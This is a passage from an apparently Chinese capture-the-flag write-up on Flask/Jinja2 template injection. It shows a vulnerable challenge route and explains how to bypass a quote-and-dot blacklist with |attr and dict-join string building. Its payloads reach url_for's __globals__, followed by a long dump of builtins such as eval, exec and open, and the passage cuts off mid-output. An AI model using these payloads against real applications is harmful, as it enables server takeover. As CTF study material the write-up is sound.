class="keyword">if</span> <span class="keyword">not</span> exp:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;need exp&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> digest:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;need digest&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 验证传递的 digest 是否与 exp 的 MD5 值匹配</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> digest == md5(exp.encode()).hexdigest():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;digest not match&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果 exp 中有黑名单字符，返回安全提示</span></span><br><span class="line">    <span class="keyword">if</span> waf(exp):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No hacker&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果通过验证，返回渲染后的字符串</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(exp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">11111</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现黑名单完全禁用了引号，还有点，也就是说我们不能用<code>__getitem__</code>的方式来拿到object里面的函数了</p>
<p>经过简单的搜索以后，前辈师傅们的文章告诉我还有用<code>attr</code>来获取里面对象的方式，具体用法是这样的</p>
<ul>
<li>{{ obj|attr(dict_key_name) }}</li>
<li>{{ obj|attr(pop)(index) }}</li>
</ul>
<p>其中这个<code>pop</code>就是一个方法，其实就是调用attr.pop，所以要用pop首先得构造出pop，继续用SSTI第一题的那个脚本来方便自己做题</p>
<p>禁用了引号也有其他方式构造字符串，我这里用了dict的join，先构造出pop</p>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload&gt; &#123;% set pop=dict(po=a,p=b)|join %&#125;&#123;% print pop %&#125; </span><br><span class="line">pop</span><br></pre></td></tr></table></figure>



<p>就得到了pop字符串，为了得到<code>__builtins__</code>，我还需要一个<code>__globals__</code>，用同样的方式弄出来</p>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload&gt; &#123;% set globals=dict(__globals=a,__=b)|join %&#125;&#123;% print globals %&#125;</span><br><span class="line">__globals__</span><br></pre></td></tr></table></figure>



<p>我用了<code>url_for</code>来获取我所需要的对象</p>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload&gt; &#123;% set pop=dict(po=a,p=b)|join %&#125;&#123;% set globals=dict(__globals=a,__=b)|join %&#125;&#123;% set global_obj=url_for|attr(globals) %&#125;&#123;% print global_obj %&#125;</span><br></pre></td></tr></table></figure>



<p>然后就得到了<code>__globals__</code>，内容如下（太长了，我用GPT格式化了一下要不然很难看清）</p>


<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    &#x27;__name__&#x27;<span class="punctuation">:</span> &#x27;flask.app&#x27;<span class="punctuation">,</span></span><br><span class="line">    &#x27;__doc__&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span></span><br><span class="line">    &#x27;__package__&#x27;<span class="punctuation">:</span> &#x27;flask&#x27;<span class="punctuation">,</span></span><br><span class="line">    &#x27;__loader__&#x27;<span class="punctuation">:</span> &lt;_frozen_importlib_external.SourceFileLoader object at <span class="number">0x7f30c7a04bb0</span>&gt;<span class="punctuation">,</span></span><br><span class="line">    &#x27;__spec__&#x27;<span class="punctuation">:</span> ModuleSpec(</span><br><span class="line">        name=&#x27;flask.app&#x27;<span class="punctuation">,</span></span><br><span class="line">        loader=&lt;_frozen_importlib_external.SourceFileLoader object at <span class="number">0x7f30c7a04bb0</span>&gt;<span class="punctuation">,</span></span><br><span class="line">        origin=&#x27;/usr/local/lib/python3<span class="number">.10</span>/site-packages/flask/app.py&#x27;</span><br><span class="line">    )<span class="punctuation">,</span></span><br><span class="line">    &#x27;__file__&#x27;<span class="punctuation">:</span> &#x27;/usr/local/lib/python3<span class="number">.10</span>/site-packages/flask/app.py&#x27;<span class="punctuation">,</span></span><br><span class="line">    &#x27;__cached__&#x27;<span class="punctuation">:</span> &#x27;/usr/local/lib/python3<span class="number">.10</span>/site-packages/flask/__pycache__/app.cpython<span class="number">-310.</span>pyc&#x27;<span class="punctuation">,</span></span><br><span class="line">    &#x27;__builtins__&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        &#x27;__name__&#x27;<span class="punctuation">:</span> &#x27;builtins&#x27;<span class="punctuation">,</span></span><br><span class="line">        &#x27;__doc__&#x27;<span class="punctuation">:</span> <span class="string">&quot;Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil&#x27; object; Ellipsis represents `...&#x27; in slices.&quot;</span><span class="punctuation">,</span></span><br><span class="line">        &#x27;__package__&#x27;<span class="punctuation">:</span> &#x27;&#x27;<span class="punctuation">,</span></span><br><span class="line">        &#x27;__loader__&#x27;<span class="punctuation">:</span> &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;__spec__&#x27;<span class="punctuation">:</span> ModuleSpec(name=&#x27;builtins&#x27;<span class="punctuation">,</span> loader=&lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;<span class="punctuation">,</span> origin=&#x27;built-in&#x27;)<span class="punctuation">,</span></span><br><span class="line">        &#x27;__build_class__&#x27;<span class="punctuation">:</span> &lt;built-in function __build_class__&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;__import__&#x27;<span class="punctuation">:</span> &lt;built-in function __import__&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;abs&#x27;<span class="punctuation">:</span> &lt;built-in function abs&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;all&#x27;<span class="punctuation">:</span> &lt;built-in function all&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;any&#x27;<span class="punctuation">:</span> &lt;built-in function any&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;ascii&#x27;<span class="punctuation">:</span> &lt;built-in function ascii&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;bin&#x27;<span class="punctuation">:</span> &lt;built-in function bin&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;breakpoint&#x27;<span class="punctuation">:</span> &lt;built-in function breakpoint&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;callable&#x27;<span class="punctuation">:</span> &lt;built-in function callable&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;chr&#x27;<span class="punctuation">:</span> &lt;built-in function chr&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;compile&#x27;<span class="punctuation">:</span> &lt;built-in function compile&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;delattr&#x27;<span class="punctuation">:</span> &lt;built-in function delattr&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;dir&#x27;<span class="punctuation">:</span> &lt;built-in function dir&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;divmod&#x27;<span class="punctuation">:</span> &lt;built-in function divmod&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;eval&#x27;<span class="punctuation">:</span> &lt;built-in function eval&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;exec&#x27;<span class="punctuation">:</span> &lt;built-in function exec&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;format&#x27;<span class="punctuation">:</span> &lt;built-in function format&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;getattr&#x27;<span class="punctuation">:</span> &lt;built-in function getattr&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;globals&#x27;<span class="punctuation">:</span> &lt;built-in function globals&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;hasattr&#x27;<span class="punctuation">:</span> &lt;built-in function hasattr&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;hash&#x27;<span class="punctuation">:</span> &lt;built-in function hash&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;hex&#x27;<span class="punctuation">:</span> &lt;built-in function hex&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;id&#x27;<span class="punctuation">:</span> &lt;built-in function id&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;input&#x27;<span class="punctuation">:</span> &lt;built-in function input&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;isinstance&#x27;<span class="punctuation">:</span> &lt;built-in function isinstance&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;issubclass&#x27;<span class="punctuation">:</span> &lt;built-in function issubclass&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;iter&#x27;<span class="punctuation">:</span> &lt;built-in function iter&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;aiter&#x27;<span class="punctuation">:</span> &lt;built-in function aiter&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;len&#x27;<span class="punctuation">:</span> &lt;built-in function len&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;locals&#x27;<span class="punctuation">:</span> &lt;built-in function locals&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;max&#x27;<span class="punctuation">:</span> &lt;built-in function max&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;min&#x27;<span class="punctuation">:</span> &lt;built-in function min&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;next&#x27;<span class="punctuation">:</span> &lt;built-in function next&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;anext&#x27;<span class="punctuation">:</span> &lt;built-in function anext&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;oct&#x27;<span class="punctuation">:</span> &lt;built-in function oct&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;ord&#x27;<span class="punctuation">:</span> &lt;built-in function ord&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;pow&#x27;<span class="punctuation">:</span> &lt;built-in function pow&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;print&#x27;<span class="punctuation">:</span> &lt;built-in function print&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;repr&#x27;<span class="punctuation">:</span> &lt;built-in function repr&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;round&#x27;<span class="punctuation">:</span> &lt;built-in function round&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;setattr&#x27;<span class="punctuation">:</span> &lt;built-in function setattr&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;sorted&#x27;<span class="punctuation">:</span> &lt;built-in function sorted&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;sum&#x27;<span class="punctuation">:</span> &lt;built-in function sum&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;vars&#x27;<span class="punctuation">:</span> &lt;built-in function vars&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;None&#x27;<span class="punctuation">:</span> None<span class="punctuation">,</span></span><br><span class="line">        &#x27;Ellipsis&#x27;<span class="punctuation">:</span> Ellipsis<span class="punctuation">,</span></span><br><span class="line">        &#x27;NotImplemented&#x27;<span class="punctuation">:</span> NotImplemented<span class="punctuation">,</span></span><br><span class="line">        &#x27;False&#x27;<span class="punctuation">:</span> False<span class="punctuation">,</span></span><br><span class="line">        &#x27;True&#x27;<span class="punctuation">:</span> True<span class="punctuation">,</span></span><br><span class="line">        &#x27;bool&#x27;<span class="punctuation">:</span> &lt;class &#x27;bool&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;memoryview&#x27;<span class="punctuation">:</span> &lt;class &#x27;memoryview&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;bytearray&#x27;<span class="punctuation">:</span> &lt;class &#x27;bytearray&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;bytes&#x27;<span class="punctuation">:</span> &lt;class &#x27;bytes&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;classmethod&#x27;<span class="punctuation">:</span> &lt;class &#x27;classmethod&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;complex&#x27;<span class="punctuation">:</span> &lt;class &#x27;complex&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;dict&#x27;<span class="punctuation">:</span> &lt;class &#x27;dict&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;enumerate&#x27;<span class="punctuation">:</span> &lt;class &#x27;enumerate&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;filter&#x27;<span class="punctuation">:</span> &lt;class &#x27;filter&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;float&#x27;<span class="punctuation">:</span> &lt;class &#x27;float&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;frozenset&#x27;<span class="punctuation">:</span> &lt;class &#x27;frozenset&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;property&#x27;<span class="punctuation">:</span> &lt;class &#x27;property&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;int&#x27;<span class="punctuation">:</span> &lt;class &#x27;int&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;list&#x27;<span class="punctuation">:</span> &lt;class &#x27;list&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;map&#x27;<span class="punctuation">:</span> &lt;class &#x27;map&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;object&#x27;<span class="punctuation">:</span> &lt;class &#x27;object&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;range&#x27;<span class="punctuation">:</span> &lt;class &#x27;range&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;reversed&#x27;<span class="punctuation">:</span> &lt;class &#x27;reversed&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;set&#x27;<span class="punctuation">:</span> &lt;class &#x27;set&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;slice&#x27;<span class="punctuation">:</span> &lt;class &#x27;slice&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;staticmethod&#x27;<span class="punctuation">:</span> &lt;class &#x27;staticmethod&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;str&#x27;<span class="punctuation">:</span> &lt;class &#x27;str&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;super&#x27;<span class="punctuation">:</span> &lt;class &#x27;super&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;tuple&#x27;<span class="punctuation">:</span> &lt;class &#x27;tuple&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;type&#x27;<span class="punctuation">:</span> &lt;class &#x27;type&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;zip&#x27;<span class="punctuation">:</span> &lt;class &#x27;zip&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;__debug__&#x27;<span class="punctuation">:</span> True<span class="punctuation">,</span></span><br><span class="line">        &#x27;BaseException&#x27;<span class="punctuation">:</span> &lt;class &#x27;BaseException&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;Exception&#x27;<span class="punctuation">:</span> &lt;class &#x27;Exception&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;TypeError&#x27;<span class="punctuation">:</span> &lt;class &#x27;TypeError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;StopAsyncIteration&#x27;<span class="punctuation">:</span> &lt;class &#x27;StopAsyncIteration&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;StopIteration&#x27;<span class="punctuation">:</span> &lt;class &#x27;StopIteration&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;GeneratorExit&#x27;<span class="punctuation">:</span> &lt;class &#x27;GeneratorExit&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;SystemExit&#x27;<span class="punctuation">:</span> &lt;class &#x27;SystemExit&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;KeyboardInterrupt&#x27;<span class="punctuation">:</span> &lt;class &#x27;KeyboardInterrupt&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;ImportError&#x27;<span class="punctuation">:</span> &lt;class &#x27;ImportError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;ModuleNotFoundError&#x27;<span class="punctuation">:</span> &lt;class &#x27;ModuleNotFoundError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;OSError&#x27;<span class="punctuation">:</span> &lt;class &#x27;OSError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;EnvironmentError&#x27;<span class="punctuation">:</span> &lt;class &#x27;OSError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;IOError&#x27;<span class="punctuation">:</span> &lt;class &#x27;OSError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;EOFError&#x27;<span class="punctuation">:</span> &lt;class &#x27;EOFError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;RuntimeError&#x27;<span class="punctuation">:</span> &lt;class &#x27;RuntimeError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;RecursionError&#x27;<span class="punctuation">:</span> &lt;class &#x27;RecursionError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;NotImplementedError&#x27;<span class="punctuation">:</span> &lt;class &#x27;NotImplementedError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;NameError&#x27;<span class="punctuation">:</span> &lt;class &#x27;NameError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;UnboundLocalError&#x27;<span class="punctuation">:</span> &lt;class &#x27;UnboundLocalError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;AttributeError&#x27;<span class="punctuation">:</span> &lt;class &#x27;AttributeError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;SyntaxError&#x27;<span class="punctuation">:</span> &lt;class &#x27;SyntaxError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;IndentationError&#x27;<span class="punctuation">:</span> &lt;class &#x27;IndentationError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;TabError&#x27;<span class="punctuation">:</span> &lt;class &#x27;TabError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;LookupError&#x27;<span class="punctuation">:</span> &lt;class &#x27;LookupError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;IndexError&#x27;<span class="punctuation">:</span> &lt;class &#x27;IndexError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;KeyError&#x27;<span class="punctuation">:</span> &lt;class &#x27;KeyError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;ValueError&#x27;<span class="punctuation">:</span> &lt;class &#x27;ValueError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;UnicodeError&#x27;<span class="punctuation">:</span> &lt;class &#x27;UnicodeError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;UnicodeEncodeError&#x27;<span class="punctuation">:</span> &lt;class &#x27;UnicodeEncodeError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;UnicodeDecodeError&#x27;<span class="punctuation">:</span> &lt;class &#x27;UnicodeDecodeError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;UnicodeTranslateError&#x27;<span class="punctuation">:</span> &lt;class &#x27;UnicodeTranslateError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;AssertionError&#x27;<span class="punctuation">:</span> &lt;class &#x27;AssertionError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;ArithmeticError&#x27;<span class="punctuation">:</span> &lt;class &#x27;ArithmeticError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;FloatingPointError&#x27;<span class="punctuation">:</span> &lt;class &#x27;FloatingPointError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;OverflowError&#x27;<span class="punctuation">:</span> &lt;class &#x27;OverflowError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;ZeroDivisionError&#x27;<span class="punctuation">:</span> &lt;class &#x27;ZeroDivisionError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;SystemError&#x27;<span class="punctuation">:</span> &lt;class &#x27;SystemError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;ReferenceError&#x27;<span class="punctuation">:</span> &lt;class &#x27;ReferenceError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;MemoryError&#x27;<span class="punctuation">:</span> &lt;class &#x27;MemoryError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;BufferError&#x27;<span class="punctuation">:</span> &lt;class &#x27;BufferError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;Warning&#x27;<span class="punctuation">:</span> &lt;class &#x27;Warning&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;UserWarning&#x27;<span class="punctuation">:</span> &lt;class &#x27;UserWarning&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;EncodingWarning&#x27;<span class="punctuation">:</span> &lt;class &#x27;EncodingWarning&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;DeprecationWarning&#x27;<span class="punctuation">:</span> &lt;class &#x27;DeprecationWarning&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;PendingDeprecationWarning&#x27;<span class="punctuation">:</span> &lt;class &#x27;PendingDeprecationWarning&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;SyntaxWarning&#x27;<span class="punctuation">:</span> &lt;class &#x27;SyntaxWarning&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;RuntimeWarning&#x27;<span class="punctuation">:</span> &lt;class &#x27;RuntimeWarning&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;FutureWarning&#x27;<span class="punctuation">:</span> &lt;class &#x27;FutureWarning&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;ImportWarning&#x27;<span class="punctuation">:</span> &lt;class &#x27;ImportWarning&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;UnicodeWarning&#x27;<span class="punctuation">:</span> &lt;class &#x27;UnicodeWarning&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;BytesWarning&#x27;<span class="punctuation">:</span> &lt;class &#x27;BytesWarning&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;ResourceWarning&#x27;<span class="punctuation">:</span> &lt;class &#x27;ResourceWarning&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;ConnectionError&#x27;<span class="punctuation">:</span> &lt;class &#x27;ConnectionError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;BlockingIOError&#x27;<span class="punctuation">:</span> &lt;class &#x27;BlockingIOError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;BrokenPipeError&#x27;<span class="punctuation">:</span> &lt;class &#x27;BrokenPipeError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;ChildProcessError&#x27;<span class="punctuation">:</span> &lt;class &#x27;ChildProcessError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;ConnectionAbortedError&#x27;<span class="punctuation">:</span> &lt;class &#x27;ConnectionAbortedError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;ConnectionRefusedError&#x27;<span class="punctuation">:</span> &lt;class &#x27;ConnectionRefusedError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;ConnectionResetError&#x27;<span class="punctuation">:</span> &lt;class &#x27;ConnectionResetError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;FileExistsError&#x27;<span class="punctuation">:</span> &lt;class &#x27;FileExistsError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;FileNotFoundError&#x27;<span class="punctuation">:</span> &lt;class &#x27;FileNotFoundError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;IsADirectoryError&#x27;<span class="punctuation">:</span> &lt;class &#x27;IsADirectoryError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;NotADirectoryError&#x27;<span class="punctuation">:</span> &lt;class &#x27;NotADirectoryError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;InterruptedError&#x27;<span class="punctuation">:</span> &lt;class &#x27;InterruptedError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;PermissionError&#x27;<span class="punctuation">:</span> &lt;class &#x27;PermissionError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;ProcessLookupError&#x27;<span class="punctuation">:</span> &lt;class &#x27;ProcessLookupError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;TimeoutError&#x27;<span class="punctuation">:</span> &lt;class &#x27;TimeoutError&#x27;&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;open&#x27;<span class="punctuation">:</span> &lt;built-in function open&gt;<span class="punctuation">,</span></span><br><span class="line">        &#x27;quit&#x27;<span class="punctuation">:</span> Use quit() or Ctrl-D 